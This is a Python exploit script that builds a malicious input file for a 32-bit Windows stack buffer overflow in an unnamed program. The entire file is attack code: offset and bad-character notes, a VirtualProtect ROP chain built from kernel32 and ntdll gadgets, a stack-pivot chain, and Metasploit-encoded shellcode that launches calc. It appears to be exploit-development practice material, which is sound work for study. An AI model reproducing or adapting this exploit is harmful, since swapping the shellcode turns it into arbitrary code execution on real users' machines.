import struct

# Setting up the output file for the exploit
outputfile = "console.txt"

# Bad characters for the stack overflow
badchars = "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28"

def stack_rop_chain():
	# this rop chain is used to jump back to beginning of the payload
	rop_gadgets = [	        
        # Jump back replacement with a ROP chain
        0x7dde87ea,  # POP ECX # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
		0xfffffbe8,  # 0018FF24 (ESP) + fffffbe8 = 0018FB0C (Payload)
        0x7df3f8c3,  # ADD ESP,ECX # POP EBP # RETN 0x04    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def create_rop_chain():
    # this rop chain is designed to change the memory permissions of the payload location
    # rop chain generated with mona.py - www.corelan.be
    # !mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -m ntdll.dll,kernel32.dll
    rop_gadgets = [
        # Register setup for VirtualProtect() :
        # --------------------------------------------
        # EAX = NOP (0x90909090)
        # ECX = lpOldProtect (ptr to W address)
        # EDX = NewProtect (0x40)
        # EBX = dwSize
        # ESP = lPAddress (automatic)
        # EBP = ReturnTo (ptr to jmp esp)
        # ESI = ptr to VirtualProtect()
        # EDI = ROP NOP (RETN)

        #######################
        # Padding remnant for the stack pivoting adjustment
        0x41414141,  # Padding for EBP

        #[---INFO:gadgets_to_set_esi:---] Not required as ESI changes below
        # 0x7DD743CE,  # ptr to kernel32.VirtualProtect // Manual fix
        # 0x7dea27ec,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04 [ntdll.dll] ** ASLR 
        # 0x7dd7071c,  # XCHG EAX,ESI # RETN [kernel32.dll] ** ASLR 
        # 0x41414141,  # Filler (RETN offset compensation)

        #[---INFO:gadgets_to_set_ebx and esi---] // Manual Fix
        # 0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
        0x7ddff385,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x41414141,  # Filler (compensate)
        0xfffffbdb,  # Value to negate, will become 0x00000425 
        0x7de0bc6f,  # NEG EAX # POP EBP # RETN 0x04    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
        0x41414141,  # Filler (compensate)
        0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}        0x41414141,  # Filler (compensate)
        0x48414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x7de9f9db,  # MOV EBX,ECX # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10    ** [ntdll.dll] **   |   {PAGE_EXECUTE_READ}        0x41414141,  # Filler (compensate)
        0x44414141,  # Filler (compensate)
        0x47414141,  # Filler (compensate)
        0x45414141,  # Filler (compensate)
        0x46414141,  # Filler (compensate)
        # This goes to ESI
        0x7DD743CE,  # ptr to kernel32.VirtualProtect

        #[---INFO:gadgets_to_set_edx:---]
        0x7ddff385,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x41414141,  # Filler (compensate)
        0x42414141,  # Filler (compensate)
        0x43414141,  # Filler (compensate)
        0x44414141,  # Filler (compensate)
        0xffffffdf,  # put delta into eax (-> put 0x00000040 into edx)
        0x7df36814,  # ADD EAX,61 # POP EBP # RETN 0x04 [ntdll.dll] ** ASLR 
        0x45414141,  # Filler (compensate)
        0x7decf1c0,  # XCHG EAX,EDX # RETN [ntdll.dll] ** ASLR 
        0x46414141,  # Filler (RETN offset compensation)

        #[---INFO:gadgets_to_set_ecx:---]
        0x7df46e64,  # POP ECX # RETN [ntdll.dll] ** ASLR 
        0x7df71fa5,  # &Writable location [ntdll.dll] ** ASLR

        #[---INFO:gadgets_to_set_edi:---]
        0x7deebd04,  # POP EDI # RETN [ntdll.dll] ** ASLR 
        0x7df32522,  # RETN (ROP NOP) [ntdll.dll] ** ASLR

        #[---INFO:gadgets_to_set_ebp:---]
        0x7df447c2,  # POP EBP # RETN [ntdll.dll] ** ASLR 
        0x7dd9493f,  # & push esp # ret  [kernel32.dll] ** ASLR

        #[---INFO:gadgets_to_set_eax:---]
        0x7de11556,  # POP EAX # RETN [kernel32.dll] ** ASLR 
        0x90909090,  # nop

        #[---INFO:pushad:---]
        #0x7de2b284,  # PUSHAD # RETN 0x0C [kernel32.dll] ** ASLR 
        0x7dd7d615,  # PUSHAD # ADD AL,0 # RETN    ** [kernel32.dll] **   |   {PAGE_EXECUTE_READ}
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

# 32-bit shellcode is generated by Metasploit Framework to run calc
# Bad characters should be avoided
# NOPs are used to avoid any dynamic issues
# msf5 payload(windows/exec) > generate -b "\x00\x09\x0a\x0b\x0c\x0d\x1a\x1b\x20\x28" -f python
# windows/exec - 216 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, 
# CMD=calc
buf =  b"\x90"*8
buf += b"\xb8\xa3\xbc\x21\x12\xd9\xeb\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x30\x83\xc2\x04\x31\x42\x0f\x03\x42\xac\x5e"
buf += b"\xd4\xee\x5a\x1c\x17\x0f\x9a\x41\x91\xea\xab\x41\xc5"
buf += b"\x7f\x9b\x71\x8d\xd2\x17\xf9\xc3\xc6\xac\x8f\xcb\xe9"
buf += b"\x05\x25\x2a\xc7\x96\x16\x0e\x46\x14\x65\x43\xa8\x25"
buf += b"\xa6\x96\xa9\x62\xdb\x5b\xfb\x3b\x97\xce\xec\x48\xed"
buf += b"\xd2\x87\x02\xe3\x52\x7b\xd2\x02\x72\x2a\x69\x5d\x54"
buf += b"\xcc\xbe\xd5\xdd\xd6\xa3\xd0\x94\x6d\x17\xae\x26\xa4"
buf += b"\x66\x4f\x84\x89\x47\xa2\xd4\xce\x6f\x5d\xa3\x26\x8c"
buf += b"\xe0\xb4\xfc\xef\x3e\x30\xe7\x57\xb4\xe2\xc3\x66\x19"
buf += b"\x74\x87\x64\xd6\xf2\xcf\x68\xe9\xd7\x7b\x94\x62\xd6"
buf += b"\xab\x1d\x30\xfd\x6f\x46\xe2\x9c\x36\x22\x45\xa0\x29"
buf += b"\x8d\x3a\x04\x21\x23\x2e\x35\x68\x29\xb1\xcb\x16\x1f"
buf += b"\xb1\xd3\x18\x0f\xda\xe2\x93\xc0\x9d\xfa\x71\xa5\x42"
buf += b"\x19\x50\xd3\xea\x84\x31\x5e\x77\x37\xec\x9c\x8e\xb4"
buf += b"\x05\x5c\x75\xa4\x6f\x59\x31\x62\x83\x13\x2a\x07\xa3"
buf += b"\x80\x4b\x02\xc0\x47\xd8\xce\x07"

shellcode = buf

# ROP chain to change the permissions to RWX (0x40) using VirtualProtect
ropchain = create_rop_chain()

# To be replaced with the payload
# 1032 - length of the payload
padding = ropchain + shellcode + "\xcc"*(1032-len(shellcode)-len(ropchain))

# After using !mona pc 1500 and !mona findmsp
# Padding info in register and SEH alignment are below
# EIP contains normal pattern : 0x69423569 (offset 1036)
# ESP (0x0018ff1c) points at offset 1040 in normal pattern (length 210)
# EBP contains normal pattern : 0x42346942 (offset 1032)
# SEH record (nseh field) at 0x0018ffc4 overwritten with normal pattern : 0x336f4232 (offset 1208)

# Break point at 0x004012AF for debugging the bug
# POP EBP
# RET
ebp = "BBBB"

# Stack pivoting ROP chain replaces all EIP, ESP and rest
# It starts execution with EIP controlled and jump back
# to the ROP chain used to set permissions to RWX 
# using VirtualProtect, then execute the shellcode
stackropchain = stack_rop_chain()

buffer = padding + ebp + stackropchain

print("[+] Creating %s" % outputfile)
f = open(outputfile,'wb')
print("[+] Writing %d bytes to file" % len(buffer))
f.write(buffer)
print("[+] Done")
f.close()